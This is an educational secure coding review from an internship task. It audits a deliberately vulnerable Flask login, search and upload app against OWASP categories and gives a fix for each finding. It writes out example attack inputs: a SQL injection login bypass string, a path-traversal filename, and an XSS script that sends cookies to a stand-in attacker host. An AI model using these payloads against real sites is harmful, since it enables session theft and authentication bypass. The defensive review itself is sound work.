# Secure Coding Review — VulnPortal (Flask / Python)

**CodeAlpha Cyber Security Internship — Task 3: Secure Coding Review**

**Application reviewed:** `vulnerable_app/app.py` — a small Flask web app with login, search, and file upload features.
**Review method:** Manual line-by-line inspection (static review), informed by the OWASP Top 10 (2021) categories.
**Scope:** Single-file Flask application, SQLite backend, no third-party auth.

---

## 1. Summary

The application implements a basic user portal with three features: login, user search, and avatar upload. The review found **7 vulnerabilities**, ranging from Critical to Low severity. The most serious issues are a SQL injection in the login flow and plaintext password storage — either one alone could lead to full account/database compromise. None of the input-handling code in this app should be reused in a production system without the fixes below.

| ID | Vulnerability | Severity | OWASP Category |
|----|---------------|----------|-----------------|
| VULN-01 | Hardcoded secret key | High | A02:2021 – Cryptographic Failures |
| VULN-02 | Plaintext password storage | Critical | A02:2021 – Cryptographic Failures |
| VULN-03 | SQL Injection in login | Critical | A03:2021 – Injection |
| VULN-04 | Broken access control on `/dashboard` | High | A01:2021 – Broken Access Control |
| VULN-05 | Reflected XSS in `/search` | High | A03:2021 – Injection |
| VULN-06 | Unrestricted file upload | High | A04:2021 – Insecure Design |
| VULN-07 | Debug mode enabled | Medium | A05:2021 – Security Misconfiguration |

---

## 2. Detailed Findings

### VULN-03 — SQL Injection in `/login` (Critical)

**Location:** `login()`, the `query = f"SELECT ... WHERE username = '{username}' AND password = '{password}'"` line.

**Issue:** User-supplied `username` and `password` are inserted directly into a SQL string using an f-string. An attacker can submit a username like:

```
' OR '1'='1' --
```

This closes the string early and forces the WHERE clause to always evaluate true, logging the attacker in as the first user in the table (typically the admin) without knowing any password.

**Impact:** Full authentication bypass; depending on the DB user's permissions, potentially full database read/write access.

**Fix:** Use parameterized queries everywhere — never build SQL with string formatting or concatenation.

```python
cur.execute(
    "SELECT id, username, is_admin FROM users WHERE username = ? AND password = ?",
    (username, password)
)
```

Note the app's own `/search` route already does this correctly — it's a good example of the right pattern existing right next to the wrong one, which is a common real-world pattern review tools and reviewers should watch for.

---

### VULN-02 — Plaintext Password Storage (Critical)

**Location:** `init_db()` — passwords inserted as raw strings (`"admin123"`, `"password1"`).

**Issue:** Passwords are stored and compared as plaintext. If the database is ever leaked, copied, or accessed by an over-privileged insider, every user's password is immediately exposed — and since people reuse passwords, that exposure extends to other services.

**Fix:** Hash passwords with a slow, salted algorithm designed for passwords (not a general-purpose hash like MD5/SHA-256):

```python
from werkzeug.security import generate_password_hash, check_password_hash

# On signup/seed:
hashed = generate_password_hash(password)

# On login:
if check_password_hash(stored_hash, submitted_password):
    ...
```

`bcrypt` or `argon2` are also good choices, especially via libraries like `passlib`.

---

### VULN-01 — Hardcoded Secret Key (High)

**Location:** `app.secret_key = "supersecret123"`

**Issue:** Flask uses `secret_key` to cryptographically sign session cookies. A hardcoded, guessable key — especially one checked into source control / a public GitHub repo — lets an attacker forge valid session cookies, including ones that claim `is_admin: 1`.

**Fix:** Load the secret from an environment variable or secrets manager, generated randomly per deployment, and never commit it:

```python
import os
app.secret_key = os.environ["FLASK_SECRET_KEY"]  # set via env, not in code
```

---

### VULN-04 — Broken Access Control on `/dashboard` (High)

**Location:** `dashboard()`

**Issue:** The route reads `session.get(...)` but never verifies a session actually exists before rendering "Welcome" content. While this particular route doesn't leak much, the pattern — assuming a session is valid rather than checking — is exactly how more sensitive routes end up exposed later as the app grows.

**Fix:** Explicitly gate the route and redirect unauthenticated users:

```python
@app.route("/dashboard")
def dashboard():
    if "user_id" not in session:
        return redirect("/login")
    ...
```

For multiple protected routes, wrap this in a reusable `@login_required` decorator rather than repeating the check.

---

### VULN-05 — Reflected XSS in `/search` (High)

**Location:** `search()` — `results_html` is built with an f-string embedding raw `term`, then rendered with `{{ results | safe }}`.

**Issue:** The `|safe` filter tells Jinja2 "trust this string, don't escape it." Combined with unescaped user input, a search like:

```
<script>document.location='https://evil.example/steal?c='+document.cookie</script>
```

executes in the victim's browser, since the search page is server-rendered with that string and a victim could be lured to click a crafted link containing this payload in the `q` parameter.

**Impact:** Session hijacking, credential theft, or any action the victim's browser can perform on their behalf on this site.

**Fix:** Never mark user-influenced content as `|safe`. Let Jinja2's default auto-escaping do its job:

```python
return render_template_string("""
    <form method="GET">
        <input name="q" value="{{ term }}">
    </form>
    <h2>Search results for: {{ term }}</h2>
    <ul>
    {% for username in usernames %}
        <li>{{ username }}</li>
    {% endfor %}
    </ul>
""", term=term, usernames=[r[0] for r in rows])
```

Building HTML as raw strings and re-inserting it is itself a smell — pass data, not pre-built markup, into templates.

---

### VULN-06 — Unrestricted File Upload (High)

**Location:** `upload()` — `f.save(os.path.join(UPLOAD_FOLDER, f.filename))`

**Issues (two distinct problems):**
1. **No file type validation** — any file extension is accepted, including `.php`, `.html`, or executable scripts, which could later be served or executed depending on hosting config.
2. **Unsanitized filename → path traversal** — `f.filename` is attacker-controlled. A filename like `../../app.py` could overwrite application files outside the intended upload directory.

**Fix:**
```python
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif"}

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

f = request.files.get("avatar")
if f and allowed_file(f.filename):
    filename = secure_filename(f.filename)
    f.save(os.path.join(UPLOAD_FOLDER, filename))
else:
    return "Invalid file type", 400
```
Also consider a file-size limit (`MAX_CONTENT_LENGTH`) and storing uploads outside the web root.

---

### VULN-07 — Debug Mode Enabled (Medium)

**Location:** `app.run(debug=True, ...)`

**Issue:** Flask's debug mode, if accidentally left on in a deployed environment, exposes the Werkzeug interactive debugger on unhandled exceptions — which allows arbitrary Python code execution from the browser for anyone who can trigger an error.

**Fix:** Never set `debug=True` outside local development; control it via environment-based config and ensure it defaults to `False`:

```python
app.run(debug=os.environ.get("FLASK_DEBUG", "0") == "1")
```

---

## 3. General Recommendations

- **Adopt parameterized queries / an ORM (e.g. SQLAlchemy) everywhere**, not just in some routes — consistency prevents regressions.
- **Centralize authentication/authorization** in decorators rather than ad-hoc per-route checks.
- **Treat all user input as untrusted** by default: validate, sanitize, and let templating engines auto-escape rather than overriding them.
- **Run a static analysis tool** (e.g. `bandit` for Python) in CI to catch these classes of bugs automatically going forward:
  ```bash
  pip install bandit
  bandit -r vulnerable_app/
  ```
- **Use environment variables / a secrets manager** for all keys and credentials — never hardcode or commit them.
- **Add automated tests** for security-relevant behavior (e.g. "login with `' OR '1'='1` must fail").

## 4. What I Learned

This exercise reinforced that most real-world vulnerabilities aren't exotic — they come from a handful of repeating patterns: trusting user input, string-building queries/HTML instead of using safe APIs, and configuration left at insecure defaults. It was also a good reminder that secure and insecure code often sit right next to each other in the same file (see `/login` vs `/search`), so a security review needs to check every code path individually rather than assuming consistency.

---

*This report and the accompanying vulnerable application were built for educational purposes as part of the CodeAlpha Cyber Security Internship (Task 3: Secure Coding Review). The vulnerable app should never be deployed to a public-facing server.*
